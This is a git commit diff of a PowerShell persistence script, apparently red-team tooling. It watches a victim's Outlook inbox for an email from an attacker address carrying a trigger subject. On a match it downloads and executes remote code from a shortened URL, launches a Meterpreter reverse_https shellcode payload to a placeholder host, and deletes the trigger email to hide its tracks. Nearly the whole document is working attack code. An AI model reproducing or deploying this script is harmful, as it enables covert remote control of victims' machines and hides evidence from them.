14779107415266e700c454c286de93ab1ac23c77
enigma0x3 <matthew@webnelson.net>
2015-01-08 17:57:28 -0500

    Update Persist.ps1

--- Persist.ps1
+++ Persist.ps1
@@ -1,15 +1,6 @@
-[CmdletBinding()] Param(
-        [Parameter(Position=0, Mandatory = $True)]
-        [String]
-        $Email,
+$AttackerEmail = "ATTACKEREMAIL@EMAIL.COM"
+$TriggerWord = "EMAILSUBJECT"
 
-        [Parameter(Position=1, Mandatory = $True)]
-        [String]
-        $Trigger,
-
-
-)
-function Persist{
 While($True){
 $olFolderInbox = 6
 $outlook = new-object -com outlook.application;
@@ -17,21 +8,17 @@ $ns = $outlook.GetNameSpace("MAPI");
 $inbox = $ns.GetDefaultFolder($olFolderInbox)
 $Emails = $inbox.items
 $Emails | foreach { 
-if($_.SenderEmailAddress -match $Email -and $_.subject -match $Trigger)
+if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
 {Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
 IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST $global:IP -LPORT $global:Port -
-
-Force}
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.xx.xxx -LPORT 1111 -Force}
 }}
 
 $Emails | foreach { 
-if($_.SenderEmailAddress -match $Email -and $_.subject -match $Trigger)
+if($_.SenderEmailAddress -match $AttackerEmail -and $_.subject -match $TriggerWord)
 {$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
 $EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
-$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq $Trigger -and 
-
-$_.SenderEmailAddress -eq $Email}
+$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq $TriggerWord -and $_.SenderEmailAddress -eq $AttackerEmail}
 $EmailToDelete.Delete() }
 
 }
@@ -42,5 +29,4 @@ Start-Sleep -s 10
 
 
 
-}
 }
